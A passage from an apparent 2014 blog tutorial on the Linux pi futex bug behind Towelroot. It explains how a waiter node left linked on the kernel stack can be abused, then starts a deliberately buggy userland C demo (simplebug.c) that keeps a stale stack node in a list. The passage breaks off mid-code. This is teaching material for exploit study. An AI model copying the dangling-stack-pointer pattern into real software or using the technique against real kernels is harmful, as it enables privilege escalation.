<p>For those of you who are not that curious to read the papers, I will try to simplify it: when there are tasks waiting for a pi futex, the kernel creates a priority list of those tasks (to be precise, it creates a waiter structure for that task) . A priority list is used because we want to maintain a property of a pi futex, i.e, task with a high priority will be waken first even though it waits after a low priority task.</p>
<p>The node of this priority list is stored in the kernel stack. Note that when a task waits for a futex, it will wait in kernel context, and will not return to user land. So the use of kernel stack here completely makes sense. Please note that before kernel 3.13, the kernel uses plist, but after 3.13 it uses rb_node for storing the list. If you want to exploit latest kernel, you will need to handle that.</p>
<p>This is actually where the bug is: there is a case where the waiter is still linked in the waiter list and the function returns. Please note that a kernel stack is completely separate from user stack. You can not influence kernel stack just by calling your own function in the userspace. You can manipulate kernel stack value (like the first example) by doing syscall.</p>
<p>If you don’t understand much about kernel, you can imagine a syscall is like a remote call to another machine: the execution on the other “machine” will use a separate stack from the one that you use in your local (user mode code). Note that this analogy doesn’t really hold when we talk about exploiting memory space.</p>
<h3>A simpler bug</h3>
<p>Before going into the detail about how the bug can be exploited in the kernel. I will present a much smaller and easier to understand userland code that has a similar bug. After you understand this, I will show how the kernel exploit works based on the same principle:</p>
<script src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/9e4381581a404f742dad9c48877dbc24.js.下載" type="text/javascript"></script><link rel="stylesheet" href="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/gist-embed-ff75a167df5efbfedb0e388793ca9fe7.css"><div id="gist93138662" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-simplebug-c" class="file my-2">
    
  <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

      
<div class="js-check-bidi blob-code-content">
  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="simplebug.c">
        <tbody><tr>
          <td id="file-simplebug-c-L1" class="blob-num js-line-number js-code-nav-line-number" data-line-number="1"></td>
          <td id="file-simplebug-c-LC1" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L2" class="blob-num js-line-number js-code-nav-line-number" data-line-number="2"></td>
          <td id="file-simplebug-c-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">/*</span>*</span></td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L3" class="blob-num js-line-number js-code-nav-line-number" data-line-number="3"></td>
          <td id="file-simplebug-c-LC3" class="blob-code blob-code-inner js-file-line"><span class="pl-c"> * An example of bug that can be exploited through stack manipulation</span></td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L4" class="blob-num js-line-number js-code-nav-line-number" data-line-number="4"></td>
          <td id="file-simplebug-c-LC4" class="blob-code blob-code-inner js-file-line"><span class="pl-c"> * Use -m32 to compile as 32 bit app, so that the int size is the same as pointer size</span></td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L5" class="blob-num js-line-number js-code-nav-line-number" data-line-number="5"></td>
          <td id="file-simplebug-c-LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-c"> <span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L6" class="blob-num js-line-number js-code-nav-line-number" data-line-number="6"></td>
          <td id="file-simplebug-c-LC6" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdio.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L7" class="blob-num js-line-number js-code-nav-line-number" data-line-number="7"></td>
          <td id="file-simplebug-c-LC7" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdlib.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L8" class="blob-num js-line-number js-code-nav-line-number" data-line-number="8"></td>
          <td id="file-simplebug-c-LC8" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>string.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L9" class="blob-num js-line-number js-code-nav-line-number" data-line-number="9"></td>
          <td id="file-simplebug-c-LC9" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L10" class="blob-num js-line-number js-code-nav-line-number" data-line-number="10"></td>
          <td id="file-simplebug-c-LC10" class="blob-code blob-code-inner js-file-line"><span class="pl-k">struct</span> node {</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L11" class="blob-num js-line-number js-code-nav-line-number" data-line-number="11"></td>
          <td id="file-simplebug-c-LC11" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">const</span> <span class="pl-k">char</span> *value;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L12" class="blob-num js-line-number js-code-nav-line-number" data-line-number="12"></td>
          <td id="file-simplebug-c-LC12" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">struct</span> node *next;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L13" class="blob-num js-line-number js-code-nav-line-number" data-line-number="13"></td>
          <td id="file-simplebug-c-LC13" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">struct</span> node *prev;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L14" class="blob-num js-line-number js-code-nav-line-number" data-line-number="14"></td>
          <td id="file-simplebug-c-LC14" class="blob-code blob-code-inner js-file-line">};</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L15" class="blob-num js-line-number js-code-nav-line-number" data-line-number="15"></td>
          <td id="file-simplebug-c-LC15" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L16" class="blob-num js-line-number js-code-nav-line-number" data-line-number="16"></td>
          <td id="file-simplebug-c-LC16" class="blob-code blob-code-inner js-file-line"><span class="pl-k">struct</span> list {</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L17" class="blob-num js-line-number js-code-nav-line-number" data-line-number="17"></td>
          <td id="file-simplebug-c-LC17" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">struct</span> node *head;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L18" class="blob-num js-line-number js-code-nav-line-number" data-line-number="18"></td>
          <td id="file-simplebug-c-LC18" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">struct</span> node *tail;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L19" class="blob-num js-line-number js-code-nav-line-number" data-line-number="19"></td>
          <td id="file-simplebug-c-LC19" class="blob-code blob-code-inner js-file-line">};</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L20" class="blob-num js-line-number js-code-nav-line-number" data-line-number="20"></td>
          <td id="file-simplebug-c-LC20" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L21" class="blob-num js-line-number js-code-nav-line-number" data-line-number="21"></td>
          <td id="file-simplebug-c-LC21" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">list_add</span>(<span class="pl-k">struct</span> list *lst, <span class="pl-k">struct</span> node *newnode)</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L22" class="blob-num js-line-number js-code-nav-line-number" data-line-number="22"></td>
          <td id="file-simplebug-c-LC22" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L23" class="blob-num js-line-number js-code-nav-line-number" data-line-number="23"></td>
          <td id="file-simplebug-c-LC23" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (lst-&gt;<span class="pl-smi">head</span>==<span class="pl-c1">NULL</span>) {</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L24" class="blob-num js-line-number js-code-nav-line-number" data-line-number="24"></td>
          <td id="file-simplebug-c-LC24" class="blob-code blob-code-inner js-file-line">		lst-&gt;<span class="pl-smi">head</span> = newnode;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L25" class="blob-num js-line-number js-code-nav-line-number" data-line-number="25"></td>
          <td id="file-simplebug-c-LC25" class="blob-code blob-code-inner js-file-line">		lst-&gt;<span class="pl-smi">tail</span> = newnode;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L26" class="blob-num js-line-number js-code-nav-line-number" data-line-number="26"></td>
          <td id="file-simplebug-c-LC26" class="blob-code blob-code-inner js-file-line">	} <span class="pl-k">else</span> {</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L27" class="blob-num js-line-number js-code-nav-line-number" data-line-number="27"></td>
          <td id="file-simplebug-c-LC27" class="blob-code blob-code-inner js-file-line">		newnode-&gt;<span class="pl-smi">prev</span> = lst-&gt;<span class="pl-smi">tail</span>;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L28" class="blob-num js-line-number js-code-nav-line-number" data-line-number="28"></td>
          <td id="file-simplebug-c-LC28" class="blob-code blob-code-inner js-file-line">		lst-&gt;<span class="pl-smi">tail</span>-&gt;<span class="pl-smi">next</span> = newnode;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L29" class="blob-num js-line-number js-code-nav-line-number" data-line-number="29"></td>
          <td id="file-simplebug-c-LC29" class="blob-code blob-code-inner js-file-line">		lst-&gt;<span class="pl-smi">tail</span> = newnode;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L30" class="blob-num js-line-number js-code-nav-line-number" data-line-number="30"></td>
          <td id="file-simplebug-c-LC30" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L31" class="blob-num js-line-number js-code-nav-line-number" data-line-number="31"></td>
          <td id="file-simplebug-c-LC31" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L32" class="blob-num js-line-number js-code-nav-line-number" data-line-number="32"></td>
          <td id="file-simplebug-c-LC32" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L33" class="blob-num js-line-number js-code-nav-line-number" data-line-number="33"></td>
          <td id="file-simplebug-c-LC33" class="blob-code blob-code-inner js-file-line"><span class="pl-k">struct</span> node * <span class="pl-en">list_remove_last</span>(<span class="pl-k">struct</span> list *lst)</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L34" class="blob-num js-line-number js-code-nav-line-number" data-line-number="34"></td>
          <td id="file-simplebug-c-LC34" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L35" class="blob-num js-line-number js-code-nav-line-number" data-line-number="35"></td>
          <td id="file-simplebug-c-LC35" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">struct</span> node *result;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L36" class="blob-num js-line-number js-code-nav-line-number" data-line-number="36"></td>
          <td id="file-simplebug-c-LC36" class="blob-code blob-code-inner js-file-line">	result = lst-&gt;<span class="pl-smi">tail</span>;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L37" class="blob-num js-line-number js-code-nav-line-number" data-line-number="37"></td>
          <td id="file-simplebug-c-LC37" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L38" class="blob-num js-line-number js-code-nav-line-number" data-line-number="38"></td>
          <td id="file-simplebug-c-LC38" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (lst-&gt;<span class="pl-smi">head</span>==lst-&gt;<span class="pl-smi">tail</span>) { <span class="pl-c"><span class="pl-c">/*</span>zero or 1 element<span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L39" class="blob-num js-line-number js-code-nav-line-number" data-line-number="39"></td>
          <td id="file-simplebug-c-LC39" class="blob-code blob-code-inner js-file-line">		lst-&gt;<span class="pl-smi">head</span> = lst-&gt;<span class="pl-smi">tail</span> = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L40" class="blob-num js-line-number js-code-nav-line-number" data-line-number="40"></td>
          <td id="file-simplebug-c-LC40" class="blob-code blob-code-inner js-file-line">	} <span class="pl-k">else</span>  {</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L41" class="blob-num js-line-number js-code-nav-line-number" data-line-number="41"></td>
          <td id="file-simplebug-c-LC41" class="blob-code blob-code-inner js-file-line">		lst-&gt;<span class="pl-smi">tail</span> = lst-&gt;<span class="pl-smi">tail</span>-&gt;<span class="pl-smi">prev</span>;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L42" class="blob-num js-line-number js-code-nav-line-number" data-line-number="42"></td>
          <td id="file-simplebug-c-LC42" class="blob-code blob-code-inner js-file-line">		lst-&gt;<span class="pl-smi">tail</span>-&gt;<span class="pl-smi">next</span> = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L43" class="blob-num js-line-number js-code-nav-line-number" data-line-number="43"></td>
          <td id="file-simplebug-c-LC43" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L44" class="blob-num js-line-number js-code-nav-line-number" data-line-number="44"></td>
          <td id="file-simplebug-c-LC44" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">return</span> result;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L45" class="blob-num js-line-number js-code-nav-line-number" data-line-number="45"></td>
          <td id="file-simplebug-c-LC45" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L46" class="blob-num js-line-number js-code-nav-line-number" data-line-number="46"></td>
          <td id="file-simplebug-c-LC46" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L47" class="blob-num js-line-number js-code-nav-line-number" data-line-number="47"></td>
          <td id="file-simplebug-c-LC47" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">list_print</span>(<span class="pl-k">struct</span> list *lst)</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L48" class="blob-num js-line-number js-code-nav-line-number" data-line-number="48"></td>
          <td id="file-simplebug-c-LC48" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L49" class="blob-num js-line-number js-code-nav-line-number" data-line-number="49"></td>
          <td id="file-simplebug-c-LC49" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">struct</span> node *tmp;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L50" class="blob-num js-line-number js-code-nav-line-number" data-line-number="50"></td>
          <td id="file-simplebug-c-LC50" class="blob-code blob-code-inner js-file-line">	tmp = lst-&gt;<span class="pl-smi">head</span>;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L51" class="blob-num js-line-number js-code-nav-line-number" data-line-number="51"></td>
          <td id="file-simplebug-c-LC51" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">while</span> (tmp) {</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L52" class="blob-num js-line-number js-code-nav-line-number" data-line-number="52"></td>
          <td id="file-simplebug-c-LC52" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>Value = <span class="pl-c1">%s</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, tmp-&gt;<span class="pl-smi">value</span>);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L53" class="blob-num js-line-number js-code-nav-line-number" data-line-number="53"></td>
          <td id="file-simplebug-c-LC53" class="blob-code blob-code-inner js-file-line">		tmp = tmp-&gt;<span class="pl-smi">next</span>;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L54" class="blob-num js-line-number js-code-nav-line-number" data-line-number="54"></td>
          <td id="file-simplebug-c-LC54" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L55" class="blob-num js-line-number js-code-nav-line-number" data-line-number="55"></td>
          <td id="file-simplebug-c-LC55" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L56" class="blob-num js-line-number js-code-nav-line-number" data-line-number="56"></td>
          <td id="file-simplebug-c-LC56" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L57" class="blob-num js-line-number js-code-nav-line-number" data-line-number="57"></td>
          <td id="file-simplebug-c-LC57" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">list_add_new</span>(<span class="pl-k">struct</span> list *lst, <span class="pl-k">const</span> <span class="pl-k">char</span> *val)</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L58" class="blob-num js-line-number js-code-nav-line-number" data-line-number="58"></td>
          <td id="file-simplebug-c-LC58" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L59" class="blob-num js-line-number js-code-nav-line-number" data-line-number="59"></td>
          <td id="file-simplebug-c-LC59" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">struct</span> node *newnode  = (<span class="pl-k">struct</span> node *)<span class="pl-c1">malloc</span>(<span class="pl-k">sizeof</span>(<span class="pl-k">struct</span> node));</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L60" class="blob-num js-line-number js-code-nav-line-number" data-line-number="60"></td>
          <td id="file-simplebug-c-LC60" class="blob-code blob-code-inner js-file-line">	newnode-&gt;<span class="pl-smi">next</span> = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L61" class="blob-num js-line-number js-code-nav-line-number" data-line-number="61"></td>
          <td id="file-simplebug-c-LC61" class="blob-code blob-code-inner js-file-line">	newnode-&gt;<span class="pl-smi">value</span> = <span class="pl-c1">strdup</span>(val);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L62" class="blob-num js-line-number js-code-nav-line-number" data-line-number="62"></td>
          <td id="file-simplebug-c-LC62" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">list_add</span>(lst, newnode);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L63" class="blob-num js-line-number js-code-nav-line-number" data-line-number="63"></td>
          <td id="file-simplebug-c-LC63" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L64" class="blob-num js-line-number js-code-nav-line-number" data-line-number="64"></td>
          <td id="file-simplebug-c-LC64" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L65" class="blob-num js-line-number js-code-nav-line-number" data-line-number="65"></td>
          <td id="file-simplebug-c-LC65" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">print_with_end_of_list</span>(<span class="pl-k">struct</span> list *lst)</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L66" class="blob-num js-line-number js-code-nav-line-number" data-line-number="66"></td>
          <td id="file-simplebug-c-LC66" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L67" class="blob-num js-line-number js-code-nav-line-number" data-line-number="67"></td>
          <td id="file-simplebug-c-LC67" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">struct</span> node instack;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L68" class="blob-num js-line-number js-code-nav-line-number" data-line-number="68"></td>
          <td id="file-simplebug-c-LC68" class="blob-code blob-code-inner js-file-line">	instack.<span class="pl-smi">next</span> = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L69" class="blob-num js-line-number js-code-nav-line-number" data-line-number="69"></td>
          <td id="file-simplebug-c-LC69" class="blob-code blob-code-inner js-file-line">	instack.<span class="pl-smi">value</span> = <span class="pl-s"><span class="pl-pds">"</span>--END OF LIST--<span class="pl-pds">"</span></span>;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L70" class="blob-num js-line-number js-code-nav-line-number" data-line-number="70"></td>
          <td id="file-simplebug-c-LC70" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L71" class="blob-num js-line-number js-code-nav-line-number" data-line-number="71"></td>
          <td id="file-simplebug-c-LC71" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>Not a buggy function<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L72" class="blob-num js-line-number js-code-nav-line-number" data-line-number="72"></td>
          <td id="file-simplebug-c-LC72" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L73" class="blob-num js-line-number js-code-nav-line-number" data-line-number="73"></td>
          <td id="file-simplebug-c-LC73" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">list_add</span>(lst, &amp;instack);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L74" class="blob-num js-line-number js-code-nav-line-number" data-line-number="74"></td>
          <td id="file-simplebug-c-LC74" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">list_print</span>(lst);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L75" class="blob-num js-line-number js-code-nav-line-number" data-line-number="75"></td>
          <td id="file-simplebug-c-LC75" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">/*</span>we ignore the returned node<span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L76" class="blob-num js-line-number js-code-nav-line-number" data-line-number="76"></td>
          <td id="file-simplebug-c-LC76" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">list_remove_last</span>(lst);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L77" class="blob-num js-line-number js-code-nav-line-number" data-line-number="77"></td>
          <td id="file-simplebug-c-LC77" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L78" class="blob-num js-line-number js-code-nav-line-number" data-line-number="78"></td>
          <td id="file-simplebug-c-LC78" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L79" class="blob-num js-line-number js-code-nav-line-number" data-line-number="79"></td>
          <td id="file-simplebug-c-LC79" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">buggy_print_with_end_of_list</span>(<span class="pl-k">struct</span> list *lst)</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L80" class="blob-num js-line-number js-code-nav-line-number" data-line-number="80"></td>
          <td id="file-simplebug-c-LC80" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L81" class="blob-num js-line-number js-code-nav-line-number" data-line-number="81"></td>
          <td id="file-simplebug-c-LC81" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">int</span> dummy_var1; <span class="pl-c"><span class="pl-c">/*</span>see the article to see why i introduced this<span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L82" class="blob-num js-line-number js-code-nav-line-number" data-line-number="82"></td>
          <td id="file-simplebug-c-LC82" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">int</span> dummy_var2;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L83" class="blob-num js-line-number js-code-nav-line-number" data-line-number="83"></td>
          <td id="file-simplebug-c-LC83" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">int</span> dummy_var3;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L84" class="blob-num js-line-number js-code-nav-line-number" data-line-number="84"></td>
          <td id="file-simplebug-c-LC84" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L85" class="blob-num js-line-number js-code-nav-line-number" data-line-number="85"></td>
          <td id="file-simplebug-c-LC85" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">struct</span> node instack;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L86" class="blob-num js-line-number js-code-nav-line-number" data-line-number="86"></td>
          <td id="file-simplebug-c-LC86" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L87" class="blob-num js-line-number js-code-nav-line-number" data-line-number="87"></td>
          <td id="file-simplebug-c-LC87" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>a buggy function, here is the location of value on stack <span class="pl-c1">%p</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, &amp;instack.<span class="pl-smi">value</span>);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L88" class="blob-num js-line-number js-code-nav-line-number" data-line-number="88"></td>
          <td id="file-simplebug-c-LC88" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L89" class="blob-num js-line-number js-code-nav-line-number" data-line-number="89"></td>
          <td id="file-simplebug-c-LC89" class="blob-code blob-code-inner js-file-line">	instack.<span class="pl-smi">next</span> = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L90" class="blob-num js-line-number js-code-nav-line-number" data-line-number="90"></td>
          <td id="file-simplebug-c-LC90" class="blob-code blob-code-inner js-file-line">	instack.<span class="pl-smi">value</span> = <span class="pl-s"><span class="pl-pds">"</span>--END OF LIST--<span class="pl-pds">"</span></span>;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L91" class="blob-num js-line-number js-code-nav-line-number" data-line-number="91"></td>
          <td id="file-simplebug-c-LC91" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L92" class="blob-num js-line-number js-code-nav-line-number" data-line-number="92"></td>
          <td id="file-simplebug-c-LC92" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">list_add</span>(lst, &amp;instack);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L93" class="blob-num js-line-number js-code-nav-line-number" data-line-number="93"></td>
          <td id="file-simplebug-c-LC93" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">list_print</span>(lst);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L94" class="blob-num js-line-number js-code-nav-line-number" data-line-number="94"></td>
          <td id="file-simplebug-c-LC94" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">/*</span>we 'forgot' to remove the list element<span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L95" class="blob-num js-line-number js-code-nav-line-number" data-line-number="95"></td>
          <td id="file-simplebug-c-LC95" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L96" class="blob-num js-line-number js-code-nav-line-number" data-line-number="96"></td>
          <td id="file-simplebug-c-LC96" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L97" class="blob-num js-line-number js-code-nav-line-number" data-line-number="97"></td>
          <td id="file-simplebug-c-LC97" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L98" class="blob-num js-line-number js-code-nav-line-number" data-line-number="98"></td>
          <td id="file-simplebug-c-LC98" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">a_function_to_exploit</span>(<span class="pl-k">int</span> element_number, <span class="pl-k">void</span> * value)</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L99" class="blob-num js-line-number js-code-nav-line-number" data-line-number="99"></td>
          <td id="file-simplebug-c-LC99" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L100" class="blob-num js-line-number js-code-nav-line-number" data-line-number="100"></td>
          <td id="file-simplebug-c-LC100" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">int</span> i;</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L101" class="blob-num js-line-number js-code-nav-line-number" data-line-number="101"></td>
          <td id="file-simplebug-c-LC101" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">int</span> buf[<span class="pl-c1">10</span>];</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L102" class="blob-num js-line-number js-code-nav-line-number" data-line-number="102"></td>
          <td id="file-simplebug-c-LC102" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (element_number==-<span class="pl-c1">1</span>) { <span class="pl-c"><span class="pl-c">/*</span>print addressed of buf<span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L103" class="blob-num js-line-number js-code-nav-line-number" data-line-number="103"></td>
          <td id="file-simplebug-c-LC103" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">for</span> (i=<span class="pl-c1">0</span>; i &lt; <span class="pl-c1">10</span>; i++) {</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L104" class="blob-num js-line-number js-code-nav-line-number" data-line-number="104"></td>
          <td id="file-simplebug-c-LC104" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>location of buf[<span class="pl-c1">%d</span>] is <span class="pl-c1">%p</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, i, &amp;buf[i]);</td>
        </tr>
        <tr>
          <td id="file-simplebug-c-L105" class="blob-num js-line-number js-code-nav-line-number" data-line-number="105"></td>
          <td id="file-simplebug-c-LC105" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
